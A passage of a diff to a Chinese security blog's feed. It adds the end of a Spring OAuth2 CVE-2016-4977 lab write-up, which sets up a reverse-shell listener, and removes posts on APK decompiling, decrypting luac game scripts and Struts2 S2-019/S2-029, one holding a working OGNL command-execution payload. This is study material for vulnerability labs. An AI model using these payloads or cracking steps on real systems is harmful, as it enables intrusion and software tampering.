alt="image"></p><p>监听反弹shell，并访问URL<code>http://your-ip:8080/oauth/authorize?response_type=上面的那一长串POC&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code></p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092904.png" alt="image"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Spring Security OAuth2处理认证请求的时候如果使用了whitelabel视图，response_type参数值会被当做Spring SpEL来执行，恶意攻击者通过构造response_type值可以触发远程代码执行漏洞 &lt;/p&gt;
+&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;p&gt;使用vulhub搭建漏洞环境&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd &amp;#x2F;vulhub&amp;#x2F;spring&amp;#x2F;CVE-2016-4977&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;启动完成后，访问&lt;a href=&quot;http://your-ip:8080/%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0web%E9%A1%B5%E9%9D%A2%E3%80%82&quot;&gt;http://your-ip:8080/即可看到web页面。&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Spring Security OAuth 2.3到2.3.2&lt;/p&gt;
+&lt;p&gt;Spring Security OAuth 2.2到2.2.1&lt;/p&gt;
+&lt;p&gt;Spring Security OAuth 2.1到2.1.1&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="Spring" scheme="https://hzktester.top/tags/Spring/"/>
+    
+  </entry>
   
   <entry>
     <title>ThinkPHP 2.x 任意代码执行漏洞复现</title>
@@ -548,130 +681,6 @@
     
     
     <category term="信息泄露" scheme="https://hzktester.top/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>APP之反编译+目录结构+重新打包+重新签名</title>
-    <link href="https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91+%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84+%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85+%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D/"/>
-    <id>https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91+%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84+%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85+%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D/</id>
-    <published>2020-08-16T07:31:00.000Z</published>
-    <updated>2020-09-18T11:40:52.401Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="反编译和重新打包-apktool"><a href="#反编译和重新打包-apktool" class="headerlink" title="反编译和重新打包-apktool"></a>反编译和重新打包-apktool</h2><p>下载地址：<a href="https://ibotpeaches.github.io/Apktool/install/">https://ibotpeaches.github.io/Apktool/install/</a></p><ol><li>分别下载<strong>apktool.bat</strong>、<strong>apktool.jar</strong>，并把需要反编译的APP放在同一个目录中<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081604.png" alt="image"></li><li>在cmd窗口下进入当前目录</li><li>执行反编译命令，反编译后的文件默认输出在当前目录下的<strong>qipai</strong>文件夹<blockquote><p>apktool d qipai.apk</p></blockquote></li><li>重新打包，默认输出<strong>qipai.apk</strong>文件为当前目录<blockquote><p>apktool b test</p></blockquote><a id="more"></a><h2 id="APP目录结构"><a href="#APP目录结构" class="headerlink" title="APP目录结构"></a>APP目录结构</h2><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081605.png" alt="image"></li><li><strong>AndroidManifest.xml</strong>：安卓应用程序的全局配置文件，参考文章<a href="http://blog.chinaunix.net/uid-9185047-id-3460344.html">AndroidManifest.xml配置文件详解 </a></li><li><strong>assets</strong>:系统在编译的时候不会编译assets下的资源文件,也就是说dex文件不包含此目录下的文件（此处存放业务逻辑代码，luac加密，解密key存放于<strong>lib</strong>目录下的so文件）</li><li><strong>classes.dex</strong>：源码文件</li><li><strong>resources.arsc</strong>：包含了已被编译好的资源的二进制格式文件。</li><li><strong>res</strong>：资源文件，主要存放图片、菜单、布局文件等</li><li><strong>META-INF</strong>：apk的签名信息</li></ol><h2 id="APP重新签名"><a href="#APP重新签名" class="headerlink" title="APP重新签名"></a>APP重新签名</h2><p>参考文章：<a href="https://blog.csdn.net/lyq8479/article/details/6401093">Android应用程序签名详解</a></p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;反编译和重新打包-apktool&quot;&gt;&lt;a href=&quot;#反编译和重新打包-apktool&quot; class=&quot;headerlink&quot; title=&quot;反编译和重新打包-apktool&quot;&gt;&lt;/a&gt;反编译和重新打包-apktool&lt;/h2&gt;&lt;p&gt;下载地址：&lt;a href=&quot;https://ibotpeaches.github.io/Apktool/install/&quot;&gt;https://ibotpeaches.github.io/Apktool/install/&lt;/a&gt;&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;分别下载&lt;strong&gt;apktool.bat&lt;/strong&gt;、&lt;strong&gt;apktool.jar&lt;/strong&gt;，并把需要反编译的APP放在同一个目录中&lt;br&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081604.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
-&lt;li&gt;在cmd窗口下进入当前目录&lt;/li&gt;
-&lt;li&gt;执行反编译命令，反编译后的文件默认输出在当前目录下的&lt;strong&gt;qipai&lt;/strong&gt;文件夹&lt;blockquote&gt;
-&lt;p&gt;apktool d qipai.apk&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;/li&gt;
-&lt;li&gt;重新打包，默认输出&lt;strong&gt;qipai.apk&lt;/strong&gt;文件为当前目录&lt;blockquote&gt;
-&lt;p&gt;apktool b test&lt;/p&gt;
-&lt;/blockquote&gt;</summary>
-    
-    
-    
-    <category term="APP渗透" scheme="https://hzktester.top/categories/APP%E6%B8%97%E9%80%8F/"/>
-    
-    
-    <category term="APP反编译" scheme="https://hzktester.top/tags/APP%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>APP反编译-下载源码</title>
-    <link href="https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/"/>
-    <id>https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/</id>
-    <published>2020-08-16T07:31:00.000Z</published>
-    <updated>2020-09-18T11:41:04.722Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="dex2jar工具"><a href="#dex2jar工具" class="headerlink" title="dex2jar工具"></a>dex2jar工具</h2><ol><li>下载<a href="https://sourceforge.net/projects/dex2jar/">https://sourceforge.net/projects/dex2jar/</a></li><li>解压<strong>dex2jar.jar</strong>文件</li><li>将<strong>shini.apk</strong>文件后缀名修改为.rar然后解压<a id="more"></a></li><li>把解压后目录下的<strong>classes.dex</strong>文件复制到<strong>dex2jar</strong>解压后的文件夹中（<strong>classes.dex</strong>文件与<strong>d2j-dex2jar.bat</strong>文件同在一个目录中）<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081601.png" alt="image"></li><li>进入<strong>dex2jar</strong>目录下执行如下命令会生成<strong>classes-dex2jar.jar</strong>文件<blockquote><p>d2j-dex2jar.bat classes.dex</p></blockquote></li></ol><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081602.png" alt="image"></p><h2 id="jd-gui工具"><a href="#jd-gui工具" class="headerlink" title="jd-gui工具"></a>jd-gui工具</h2><ol><li>下载<a href="https://links.jianshu.com/go?to=http://jd.benow.ca/">https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F</a></li><li>双击打开<strong>jd-gui</strong>将<strong>classes-dex2jar.jar</strong>文件拖入即可<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081603.png" alt="image"></li><li>点击<strong>File</strong>，然后<strong>Save All Sources</strong>将<strong>class</strong>文件编译为<strong>java</strong>源文件</li></ol>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;dex2jar工具&quot;&gt;&lt;a href=&quot;#dex2jar工具&quot; class=&quot;headerlink&quot; title=&quot;dex2jar工具&quot;&gt;&lt;/a&gt;dex2jar工具&lt;/h2&gt;&lt;ol&gt;
-&lt;li&gt;下载&lt;a href=&quot;https://sourceforge.net/projects/dex2jar/&quot;&gt;https://sourceforge.net/projects/dex2jar/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;解压&lt;strong&gt;dex2jar.jar&lt;/strong&gt;文件&lt;/li&gt;
-&lt;li&gt;将&lt;strong&gt;shini.apk&lt;/strong&gt;文件后缀名修改为.rar然后解压</summary>
-    
-    
-    
-    <category term="APP渗透" scheme="https://hzktester.top/categories/APP%E6%B8%97%E9%80%8F/"/>
-    
-    
-    <category term="APP反编译" scheme="https://hzktester.top/tags/APP%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>luac的解密过程</title>
-    <link href="https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/luac%E7%9A%84%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B/"/>
-    <id>https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/luac%E7%9A%84%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B/</id>
-    <published>2020-08-16T07:31:00.000Z</published>
-    <updated>2020-09-18T11:40:48.056Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="加密解密思路"><a href="#加密解密思路" class="headerlink" title="加密解密思路"></a>加密解密思路</h2><p>将后缀为.luac文件放入到apk文件中，那么在程序运行时，势必需要对.luac文件进行解密，然后再加载运行文件。那程序是如何知道我们在加密key呢？有两个猜想：</p><ol><li>加密key写入文件，程序在解密时先读取文件中的加密key，再解密。</li><li>加密key与程序内部约定某个值。</li></ol><p>显然，第一种可以破解，可以再程序中找到解密的值。</p><a id="more"></a><h2 id="寻找加密sign和key"><a href="#寻找加密sign和key" class="headerlink" title="寻找加密sign和key"></a>寻找加密sign和key</h2><p>要反编译.luac文件，需要知道加密<strong>key</strong>和<strong>sign</strong>。</p><ol><li><p>寻找加密<strong>sign</strong>:用记事本打开某个.luac文件，文件开头的前几个字符即加密sign</p><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081606.png" alt="image"></p></li><li><p>寻找加密<strong>key</strong></p><ul><li>下载<strong>Hex Workshop</strong>工具：<a href="https://hex-workshop.en.softonic.com/download">https://hex-workshop.en.softonic.com/download</a></li><li>将<strong>lib\libgame.so</strong>文件拖入工具中</li><li><strong>ctrl+f</strong>查找<strong>sign</strong>的值</li><li><strong>sign</strong>附近相似的值就是<strong>key</strong>的值<h2 id="解密luac文件"><a href="#解密luac文件" class="headerlink" title="解密luac文件"></a>解密luac文件</h2></li></ul></li><li><p>下载<strong>XXTEADecrypt</strong>：<a href="http://on.wall.aldcup.com/download/XXTEA%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7_0141226844.exe">http://on.wall.aldcup.com/download/XXTEA%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7_0141226844.exe</a><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081607.png" alt="image"></p></li></ol>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;加密解密思路&quot;&gt;&lt;a href=&quot;#加密解密思路&quot; class=&quot;headerlink&quot; title=&quot;加密解密思路&quot;&gt;&lt;/a&gt;加密解密思路&lt;/h2&gt;&lt;p&gt;将后缀为.luac文件放入到apk文件中，那么在程序运行时，势必需要对.luac文件进行解密，然后再加载运行文件。那程序是如何知道我们在加密key呢？有两个猜想：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;加密key写入文件，程序在解密时先读取文件中的加密key，再解密。&lt;/li&gt;
-&lt;li&gt;加密key与程序内部约定某个值。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;显然，第一种可以破解，可以再程序中找到解密的值。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="APP渗透" scheme="https://hzktester.top/categories/APP%E6%B8%97%E9%80%8F/"/>
-    
-    
-    <category term="APP反编译" scheme="https://hzktester.top/tags/APP%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>S2-019 CVE-2013-4316复现过程</title>
-    <link href="https://hzktester.top/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://hzktester.top/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
-    <published>2020-08-14T07:31:00.000Z</published>
-    <updated>2020-09-27T06:35:32.460Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.15.1</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li>使用vulfocus启动环境打开url<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081401.png" alt="image"></li><li>直接使用工具获得flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081402.png" alt="image"></li></ol>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中&lt;/p&gt;
-&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.0.0 - 2.3.15.1&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-    
-    <category term="Struts2" scheme="https://hzktester.top/tags/Struts2/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>S2-029 CVE-2016-0785复现过程</title>
-    <link href="https://hzktester.top/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://hzktester.top/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
-    <published>2020-08-14T07:31:00.000Z</published>
-    <updated>2020-09-27T06:35:29.313Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。<br>在Struts2中，如下的标签就调用了OGNL进行取值。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;parameters: &lt;s:property value&#x3D;&quot;#parameters.msg&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><p>Struts2会解析value中的值，并当作OGNL表达式进行执行，获取到parameters对象的msg属性。S2-029仍然是依靠OGNL进行远程代码执行。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.24.1（不包括2.3.20.3）</p><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li>使用vulfoces搭建环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081403.png" alt="image"></li><li>POC利用</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ls&#39;).getInputStream()))</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081404.png" alt="image"></p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。&lt;br&gt;在Struts2中，如下的标签就调用了OGNL进行取值。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-    
-    <category term="Struts2" scheme="https://hzktester.top/tags/Struts2/"/>
     
   </entry>
   
